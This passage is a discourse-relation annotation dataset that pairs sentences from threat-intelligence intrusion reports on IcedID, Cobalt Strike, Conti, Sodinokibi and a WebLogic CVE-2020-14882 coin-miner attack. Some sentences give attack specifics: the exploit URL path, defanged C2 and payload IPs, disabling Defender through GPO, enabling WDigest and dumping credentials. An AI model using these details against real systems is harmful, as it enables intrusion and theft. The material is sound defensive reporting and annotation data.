        "S2": "Using the \u2018Administrator\u2019 account, SMB sessions were established to the hosts, primarily using ADMIN$, but IPC$ was also observed.",
        "relation": "MISC"
    },
    {
        "S1": "It is also worth mentioning that even after the unsuccessful remote execution attempt against a few servers due to AV, the actors decided to connect via RDP and spend over an hour looking for valuable data before disconnecting and leaving the network.",
        "S2": "It is unclear why the actors decided not to continue with their operation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is also worth mentioning that even after the unsuccessful remote execution attempt against a few servers due to AV, the actors decided to connect via RDP and spend over an hour looking for valuable data before disconnecting and leaving the network.",
        "S2": "Interestingly, we observed the operator deploying and utilizing AdFind to collect information about the hosts on the network.",
        "relation": "MISC"
    },
    {
        "S1": "No attempt was made to clean up the intrusion by the actors \u2013 artifacts that were deployed were still in operation, including C2 implants.",
        "S2": "Using the information gathered, the IcedID operator was able to focus on specific targets, obtaining access to the privileged accounts and the high value hosts.",
        "relation": "MISC"
    },
    {
        "S1": "The first stage of the IcedID malware that was executed on the host was dropped via a macro enabled Word document \u2013 as seen by Unit42.",
        "S2": "The LSASS process was accessed by an unusual process \u201cwuauclt.exe\u201d on the beachhead host.",
        "relation": "NEXT"
    },
    {
        "S1": "The LSASS process was accessed by an unusual process \u201cwuauclt.exe\u201d on the beachhead host.",
        "S2": "Discovery commands were run by IcedID during the initial execution on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "In our previous report with another IcedID infection leading to Sodinokibi ransomware we also observed the same process being used.",
        "S2": "Interestingly, we observed the operator deploying and utilizing AdFind to collect information about the hosts on the network.",
        "relation": "MISC"
    },
    {
        "S1": "Discovery commands were run by IcedID during the initial execution on the beachhead.",
        "S2": "AdFind was transferred and executed on the beachhead host.",
        "relation": "NEXT"
    },
    {
        "S1": "Interestingly, we observed the operator deploying and utilizing AdFind to collect information about the hosts on the network.",
        "S2": "The threat actor placed the AdFind binary and the results in the \u2018C:\\Recovery\u2019 folder.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Interestingly, we observed the operator deploying and utilizing AdFind to collect information about the hosts on the network.",
        "S2": "We assess this folder location was chosen to avoid raising suspicion, as compared to executing from a user or temporary folder location.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor placed the AdFind binary and the results in the \u2018C:\\Recovery\u2019 folder.",
        "S2": "The threat actors attempted and successfully managed to pivot laterally to various hosts on the domain.",
        "relation": "MISC"
    },
    {
        "S1": "We assess this folder location was chosen to avoid raising suspicion, as compared to executing from a user or temporary folder location.",
        "S2": "No exfiltration was observed; however, we were able to determine that access to the File server was achieved, with multiple access attempts and successes.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors attempted and successfully managed to pivot laterally to various hosts on the domain.",
        "S2": "Throughout the intrusion the threat actor used a mix of Port 80 and 443 for C2.",
        "relation": "MISC"
    },
    {
        "S1": "In the attack, the threat actor took around 2 minutes from initial access, to running a persistent coin miner.",
        "S2": "The threat actor exploited CVE-2020-14882 by making a request to the WebLogic server, which allowed the attacker to execute code.",
        "relation": "MISC"
    },
    {
        "S1": "The speed and number of times the exploit was ran against the target make it likely that this was an automated attack, rather than human operated intrusion.",
        "S2": "While this attack took place around a month ago the payloads used in the intrusion continue to be hosted as of this publication, indicating that this threat is still active and finding vulnerable WebLogic hosts to continue exploiting.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor exploited CVE-2020-14882 by making a request to the WebLogic server, which allowed the attacker to execute code.",
        "S2": "This vulnerability was discovered back in October 2020, which effects Oracle\u2019s WebLogic product.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor exploited CVE-2020-14882 by making a request to the WebLogic server, which allowed the attacker to execute code.",
        "S2": "Just by invoking URL path /console/images/%252E%252E%252Fconsole.portal and a little bit of tweaking of the packet sent to the server, the threat actor will be able to run their code on the server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor exploited CVE-2020-14882 by making a request to the WebLogic server, which allowed the attacker to execute code.",
        "S2": "While this attack took place around a month ago the payloads used in the intrusion continue to be hosted as of this publication, indicating that this threat is still active and finding vulnerable WebLogic hosts to continue exploiting.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While this attack took place around a month ago the payloads used in the intrusion continue to be hosted as of this publication, indicating that this threat is still active and finding vulnerable WebLogic hosts to continue exploiting.",
        "S2": "[1] We previously reported on an intrusion that also used this exploit and ended in a coin miner.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While this attack took place around a month ago the payloads used in the intrusion continue to be hosted as of this publication, indicating that this threat is still active and finding vulnerable WebLogic hosts to continue exploiting.",
        "S2": "This vulnerability was discovered back in October 2020, which effects Oracle\u2019s WebLogic product.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While this attack took place around a month ago the payloads used in the intrusion continue to be hosted as of this publication, indicating that this threat is still active and finding vulnerable WebLogic hosts to continue exploiting.",
        "S2": "Before jumping into the details of the attack, it is pertinent to understand CVE-2020-14882.",
        "relation": "MISC"
    },
    {
        "S1": "Before jumping into the details of the attack, it is pertinent to understand CVE-2020-14882.",
        "S2": "Interestingly, we can see the threat actor chose the FileSystemXmlApplicationContext class to carry out this attack, executing a file named poc.xml.",
        "relation": "MISC"
    },
    {
        "S1": "This vulnerability was discovered back in October 2020, which effects Oracle\u2019s WebLogic product.",
        "S2": "This vulnerability is easy to exploit, and leads to remote code execution (RCE) without authentication.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This vulnerability was discovered back in October 2020, which effects Oracle\u2019s WebLogic product.",
        "S2": "The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "[1] We previously reported on an intrusion that also used this exploit and ended in a coin miner.",
        "S2": "This is likely partially to kill other rival miners but also to prevent duplicate miners on the same host as the exploit was executed against the target repeatedly in quick succession, at least 12 times.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This vulnerability is easy to exploit, and leads to remote code execution (RCE) without authentication.",
        "S2": "The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system.",
        "relation": "NEXT"
    },
    {
        "S1": "In this case, we can clearly see from network logs that the attacker was probing the portal page and followed that by sending the crafted URL request.",
        "S2": "Interestingly, we can see the threat actor chose the FileSystemXmlApplicationContext class to carry out this attack, executing a file named poc.xml.",
        "relation": "MISC"
    },
    {
        "S1": "Interestingly, we can see the threat actor chose the FileSystemXmlApplicationContext class to carry out this attack, executing a file named poc.xml.",
        "S2": "The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system.",
        "relation": "MISC"
    },
    {
        "S1": "Interestingly, we can see the threat actor chose the FileSystemXmlApplicationContext class to carry out this attack, executing a file named poc.xml.",
        "S2": "We saw that the additional sys.exe binary and ldr.ps1 PowerShell script was brought in to support the Mining operation from IP address 194[.]145[.]227[.]21",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system.",
        "S2": "No privilege escalation was observed, but note that the Java.exe process was running as a high integrity process from the start.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system.",
        "S2": "We can also see that the attacker disabled firewall rules to make sure connection to the mining pool was not blocked.",
        "relation": "MISC"
    },
    {
        "S1": "Next, let us investigate the content of the PowerShell script (ldr.ps1)",
        "S2": "This binary (renamed to sysvr013.exe) was then executed by the same script.",
        "relation": "MISC"
    },
    {
        "S1": "Next, let us investigate the content of the PowerShell script (ldr.ps1)",
        "S2": "From the PowerShell script above (ldr.ps1), we can see that name is being randomized to avoid detection by blue team.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This binary (renamed to sysvr013.exe) was then executed by the same script.",
        "S2": "From the PowerShell script above (ldr.ps1), we can see that name is being randomized to avoid detection by blue team.",
        "relation": "MISC"
    },
    {
        "S1": "The first one utilizes schtasks to create a task called \u201cBrowserUpdate\u201d.",
        "S2": "As noted above, the attacker created a task called \u201cBrowserUpdate\u201d to masquerade the scheduled task as a web browser update task.",
        "relation": "ELABORATION"
    },
    {
        "S1": "From the PowerShell script above (ldr.ps1), we can see that name is being randomized to avoid detection by blue team.",
        "S2": "We can see several local discovery commands executed from the PowerShell script.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As noted above, the attacker created a task called \u201cBrowserUpdate\u201d to masquerade the scheduled task as a web browser update task.",
        "S2": "They are looking for existing mining process on the machine, such as kthreaddi, sysrv, etc.",
        "relation": "MISC"
    },
    {
        "S1": "We saw that the additional sys.exe binary and ldr.ps1 PowerShell script was brought in to support the Mining operation from IP address 194[.]145[.]227[.]21",
        "S2": "Eventually, the crypto mining operation will cause performance issue with the WebLogic server.",
        "relation": "NEXT"
    },
    {
        "S1": "We assess with moderate confidence that the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign.",
        "S2": "The threat actors then ran another round of discovery activity with native windows utilities such as nltest.exe, whoami.exe, and net.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "We assess with moderate confidence that the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign.",
        "S2": "During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM.",
        "relation": "NEXT"
    },
    {
        "S1": "The JavaScript file would eventually download and execute the IcedID malware.",
        "S2": "While there was some initial discovery activity from the IcedID malware, it went quiet, just beaconing to command and control but not performing any other activity.",
        "relation": "NEXT"
    },
    {
        "S1": "After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID.",
        "S2": "The IcedID DLL that we executed was most likely dropped through a zip file, which included a JavaScript file within it.",
        "relation": "MISC"
    },
    {
        "S1": "They then successfully escalated to SYSTEM privileges via Cobalt Strike\u2019s built-in \u201cnamed pipe impersonation\u201d (GetSystem) functionality.",
        "S2": "Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon.",
        "S2": "After a brief gap of 15 minutes, the threat actors used PsExec, to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM.",
        "S2": "To establish persistence, the attackers created a new local user on one of the domain controllers and added it to the Administrators group.",
        "relation": "MISC"
    },
    {
        "S1": "During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM.",
        "S2": "We were unable to reconstruct the DLL from memory but Maxime Thiebaut (@0xThiebaut) from NVISO helped us out.",
        "relation": "MISC"
    },
    {
        "S1": "Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment.",
        "S2": "To establish persistence, the attackers created a new local user on one of the domain controllers and added it to the Administrators group.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment.",
        "S2": "Brad had a few posts about these around the time of this intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems.",
        "S2": "The ransomware note left by the infection included a link to their Tor site for further details.",
        "relation": "MISC"
    },
    {
        "S1": "Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems.",
        "S2": "After further review of the environment (post encryption), we realized multiple systems (including a domain controller) were unable to be accessed and would not have been restorable even if the ransom had been paid.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems.",
        "S2": "Additional discovery commands were executed by Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "Conti was executed in memory with the help of the Cobalt Strike Beacons domain wide.",
        "S2": "The threat actor began lateral movement using remote execution of Cobalt Strike Beacon service binaries.",
        "relation": "MISC"
    },
    {
        "S1": "The ransomware note left by the infection included a link to their Tor site for further details.",
        "S2": "The threat actor began lateral movement using remote execution of Cobalt Strike Beacon service binaries.",
        "relation": "MISC"
    },
    {
        "S1": "After further review of the environment (post encryption), we realized multiple systems (including a domain controller) were unable to be accessed and would not have been restorable even if the ransom had been paid.",
        "S2": "Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec.",
        "relation": "MISC"
    },
    {
        "S1": "Brad had a few posts about these around the time of this intrusion.",
        "S2": "Thanks Brad!",
        "relation": "ELABORATION"
    },
    {
        "S1": "Brad had a few posts about these around the time of this intrusion.",
        "S2": "IcedID was executed via rundll32.exe and ran command and control over port 443 for the duration of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "Various commands were executed to gather more information about the compromised environment; including the currently logged on user, domain trusts, groups, etc .",
        "S2": "After moving laterally to a domain controller, they began looking for what networks were present in the environment using dsquery.",
        "relation": "MISC"
    },
    {
        "S1": "After moving laterally to a domain controller, they began looking for what networks were present in the environment using dsquery.",
        "S2": "In order to obtain SYSTEM level privileges, Cobalt Strike\u2019s built-in named piped impersonation (GetSystem) was used:",
        "relation": "MISC"
    },
    {
        "S1": "In order to obtain SYSTEM level privileges, Cobalt Strike\u2019s built-in named piped impersonation (GetSystem) was used:",
        "S2": "After this initial activity, Cobalt Strike was used to enable RDP, and allow it through the firewall, on the domain controllers.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor began lateral movement using remote execution of Cobalt Strike Beacon service binaries.",
        "S2": "Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec.",
        "S2": "They then force updated the GPO on all clients using Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec.",
        "S2": "About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory.",
        "relation": "MISC"
    },
    {
        "S1": "Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec.",
        "S2": "The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed through the IcedID process.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed through the IcedID process.",
        "S2": "To evade detection, the threat actors disabled Windows Defender by adding the below to an already linked GPO.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed through the IcedID process.",
        "S2": "This proxied traffic reported back the hostname of the threat actors machine as \u201cmikespc\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory.",
        "S2": "Some traces of this particular DLL were found in the memory dump taken from one of the compromised systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "First time that I see #Conti ransomware spread as a DLL :",
        "S2": "Conti scans the network for 445/SMB, looking for machines to encrypt.",
        "relation": "NEXT"
    },
    {
        "S1": "We assess, with moderate confidence, the Trickbot DLL that we executed was originally delivered via a malicious Office document.",
        "S2": "We assess with moderate confidence that this DLL was dropped by a malicious Office document.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors were observed leveraging Trickbot and Cobalt Strike for C2 communication.",
        "S2": "PowerView modules were also used by the threat actor executed from the Cobalt Strike beacons.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors were observed leveraging Trickbot and Cobalt Strike for C2 communication.",
        "S2": "Trickbot (click.php.dll) was manually executed on a single endpoint.",
        "relation": "MISC"
    },
    {
        "S1": "They began their discovery by running net and nltest commands as well as PowerView domain discovery modules.",
        "S2": "Before the threat actors departed the network, they successfully accessed the LSASS process and retrieved credentials from memory.",
        "relation": "NEXT"
    },
    {
        "S1": "Minutes later, Lazagne (\u201cretrieve lots of passwords\u201d)",
        "S2": "Lazagne was used with the \u201call\u201d switch, which runs all modules.",
        "relation": "NEXT"
    },
    {
        "S1": "was executed using the \u201call\u201d switch.",
        "S2": "Lazagne was used with the \u201call\u201d switch, which runs all modules.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Before the threat actors departed the network, they successfully accessed the LSASS process and retrieved credentials from memory.",
        "S2": "LSASS was accessed by rundll32, but we did not see anything written to disk.",
        "relation": "MISC"
    },
    {
        "S1": "Trickbot (click.php.dll) was manually executed on a single endpoint.",
        "S2": "Trickbot, from its injected wermgr process, spawned a command process to then run a PowerShell Cobalt Strike Beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Trickbot, from its injected wermgr process, spawned a command process to then run a PowerShell Cobalt Strike Beacon.",
        "S2": "A scheduled task was created to keep the Trickbot malware persistent on the system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Trickbot, from its injected wermgr process, spawned a command process to then run a PowerShell Cobalt Strike Beacon.",
        "S2": "The threat actor also executed a second Cobalt Strike Beacon (wsuC3C.tmp) using the injected wermgr.exe process.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor also executed a second Cobalt Strike Beacon (wsuC3C.tmp) using the injected wermgr.exe process.",
        "S2": "The following net commands were used by the threat actor from the injected Trickbot process.",
        "relation": "MISC"
    },
    {
        "S1": "Trickbot injected into wermgr.exe processes and used this for communication to command and control infrastructure.",
        "S2": "Trickbot was used to enable the storage of clear text credentials (WDigest) by setting UseLogonCredential to 1.",
        "relation": "MISC"
    },
    {
        "S1": "In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image.",
        "S2": "About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used through-out the intrusion.",
        "relation": "NEXT"
    },
    {
        "S1": "In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image.",
        "S2": "We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID.",
        "relation": "ELABORATION"
    },
    {
        "S1": "About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used through-out the intrusion.",
        "S2": "We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID.",
        "relation": "MISC"
    },
    {
        "S1": "Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers.",
        "S2": "After compromising the Exchange server, the attackers moved to domain controllers and other systems within the environment using SMB and PowerShell Beacons executed via a remote service.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID.",
        "S2": "It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID.",
        "S2": "Three and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand.",
        "relation": "NEXT"
    },
    {
        "S1": "It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.",
        "S2": "Networking worked, but because services couldn\u2019t start, we were unable to remotely manage the systems using our normal tools.",
        "relation": "MISC"
    },
    {
        "S1": "It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.",
        "S2": "After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.",
        "relation": "MISC"
    },
    {
        "S1": "The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique.",
        "S2": "After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.",
        "relation": "MISC"
    },
    {
        "S1": "After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.",
        "S2": "For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.",
        "relation": "LIST"
    },
    {
        "S1": "Three and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand.",
        "S2": "We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.",
        "relation": "MISC"
    },
    {
        "S1": "After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag -smode, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking.",
        "S2": "On certain systems, ransomware was executed without the -smode flag, and on other systems a dll was executed via rundll32 to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag -smode, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking.",
        "S2": "Booting into Safe Mode with Networking blocked the startup of security tools and other management agents.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag -smode, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking.",
        "S2": "The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful.",
        "relation": "NEXT"
    },
    {
        "S1": "After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag -smode, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking.",
        "S2": "The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days.",
        "relation": "NEXT"
    },
    {
        "S1": "Encryption did not start immediately after reboot but required a user to log in, which in this case the threat actors completed by logging in after the reboot.",
        "S2": "On certain systems, ransomware was executed without the -smode flag, and on other systems a dll was executed via rundll32 to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed.",
        "relation": "MISC"
    },
    {
        "S1": "We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.",
        "S2": "Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.",
        "relation": "MISC"
    },
    {
        "S1": "We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.",
        "S2": "If we didn\u2019t pay within 7 days the price goes up to around $400k.",
        "relation": "MISC"
    },
    {
        "S1": "On certain systems, ransomware was executed without the -smode flag, and on other systems a dll was executed via rundll32 to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed.",
        "S2": "On certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by rundll32 to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days.",
        "S2": "The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful.",
        "relation": "MISC"
    },
    {
        "S1": "The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days.",
        "S2": "The GIF however was the IcedID malware.",
        "relation": "MISC"
    },
    {
        "S1": "If we didn\u2019t pay within 7 days the price goes up to around $400k.",
        "S2": "Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful.",
        "S2": "Prior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.",
        "S2": "We believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.",
        "S2": "After execution, the malware made contact with 161.35.109[.]168 which it continued to beacon to, throughout the intrusion.",
        "relation": "NEXT"
    },
    {
        "S1": "Initial execution of the document writes a file to:",
        "S2": "This then made a network request to download a file from this URL",
        "relation": "NEXT"
    },
    {
        "S1": "Once IcedID was downloaded to the host, the malware was executed using rundll32.exe",
        "S2": "IcedID setup persistence on the beach head host using a scheduled task.",
        "relation": "NEXT"
    },
    {
        "S1": "The execution of the ransomware executable created a RunOnce key for persistence.",
        "S2": "About one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.",
        "relation": "MISC"
    },
    {
        "S1": "After completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in the wuauclt.exe process executed several PowerShell functions for UAC bypasses including:",
        "S2": "Cobalt Strike Beacon executables were transferred using SMB and executed via a remote service.",
        "relation": "MISC"
    },
    {
        "S1": "After completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in the wuauclt.exe process executed several PowerShell functions for UAC bypasses including:",
        "S2": "We believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.",
        "relation": "ELABORATION"
    },
    {
        "S1": "About one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.",
        "S2": "A flurry of LDAP queries were seen coming from wuauclt.exe (Cobalt Strike) on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "About one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.",
        "S2": "Prior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Prior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.",
        "S2": "For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "Prior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.",
        "S2": "Initial discovery by the IcedID malware occurred within minutes of execution:",
        "relation": "MISC"
    },
    {
        "S1": "Initial discovery by the IcedID malware occurred within minutes of execution:",
        "S2": "On certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by rundll32 to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.",
        "relation": "MISC"
    },
    {
        "S1": "A flurry of LDAP queries were seen coming from wuauclt.exe (Cobalt Strike) on the beachhead.",
        "S2": "For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "We believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.",
        "S2": "We\u2019ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation.",
        "relation": "MISC"
    },
    {
        "S1": "For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.",
        "S2": "For the final actions, the threat actors dropped a ransomware executable on the domain controller in C:\\Windows and then used BITSAdmin to deploy the executable to remote systems.",
        "relation": "NEXT"
    },
    {
        "S1": "For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.",
        "S2": "Data that was collected from the domain was exfiltrated to a remote server at:",
        "relation": "NEXT"
    },
    {
        "S1": "For the final actions, the threat actors dropped a ransomware executable on the domain controller in C:\\Windows and then used BITSAdmin to deploy the executable to remote systems.",
        "S2": "On certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by rundll32 to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.",
        "relation": "MISC"
    },
    {
        "S1": "The -smode flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam.",
        "S2": "The systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The -smode flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam.",
        "S2": "The *franceisshit key was used to boot the machine out of Safe Mode upon restarting the machine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Not remember seeing these before in REvil ransomware samples.",
        "S2": "So basically the actors using REvil now can use it to reboot target machines into safe mode with networking\u2026@demonslay335 @VK_Intel pic.twitter.com/dLk4EirNFO \u2014 MalwareHunterTeam (@malwrhunterteam) March 18, 2021",
        "relation": "MISC"
    },
    {
        "S1": "So basically the actors using REvil now can use it to reboot target machines into safe mode with networking\u2026@demonslay335 @VK_Intel pic.twitter.com/dLk4EirNFO \u2014 MalwareHunterTeam (@malwrhunterteam) March 18, 2021",
